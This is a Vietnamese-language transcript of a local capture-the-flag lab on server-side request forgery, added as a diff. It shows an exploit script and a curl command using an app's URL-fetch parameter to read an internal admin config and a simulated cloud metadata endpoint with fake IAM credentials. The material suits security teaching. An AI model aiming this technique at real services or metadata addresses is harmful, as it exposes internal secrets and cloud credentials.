@@ -1,0 +1,26 @@
+# Transcript lab 6.1 - SSRF co ban
+# App chinh: 127.0.0.1:8054 (python3 app.py)
+# Dich vu noi bo: 127.0.0.1:8055 (admin) + 127.0.0.1:8056 (metadata gia lap)
+#   -> python3 internal_services.py
+# Chay: python3 exploit.py
+# Ngay chay that: 2026-10-18 17:24:41
+# ============================================================
+
+[*] Buoc 1: dung binh thuong - lay URL cua chinh app
+    {'body': 'pong tu app chinh', 'ok': True, 'status': 200, 'url': 'http://127.0.0.1:8054/ping'}
+
+[*] Buoc 2: SSRF -> dich vu admin NOI BO 127.0.0.1:8055
+    {'body': '{"db_password":"sup3r-s3cr3t-db","flag":"FLAG{6.1_ssrf_doc_dich_vu_noi_bo}","service":"internal-admin"}\n', 'ok': True, 'status': 200, 'url': 'http://127.0.0.1:8055/admin/config'}
+
+[*] Buoc 3: SSRF -> metadata cloud (gia lap 127.0.0.1:8056)
+    (that la http://169.254.169.254/latest/meta-data/...)
+    {'body': '{"AccessKeyId":"AKIA_FAKE_SSRF_DEMO","Expiration":"2030-01-01T00:00:00Z","SecretAccessKey":"fakeSecret/do+not+use","Token":"FLAG{6.1_ssrf_metadata_cloud}"}\n', 'ok': True, 'status': 200, 'url': 'http://127.0.0.1:8056/latest/meta-data/iam/security-credentials/webapp-role'}
+
+[+] Flags:
+     FLAG{6.1_ssrf_doc_dich_vu_noi_bo}
+     FLAG{6.1_ssrf_metadata_cloud}
+
+# --- Minh hoa them bang curl (SSRF doc admin noi bo) ---
+$ curl -s 'localhost:8054/fetch?url=http://127.0.0.1:8055/admin/config'
+{"body":"{\"db_password\":\"sup3r-s3cr3t-db\",\"flag\":\"FLAG{6.1_ssrf_doc_dich_vu_noi_bo}\",\"service\":\"internal-admin\"}\n","ok":true,"status":200,"url":"http://127.0.0.1:8055/admin/config"}
+
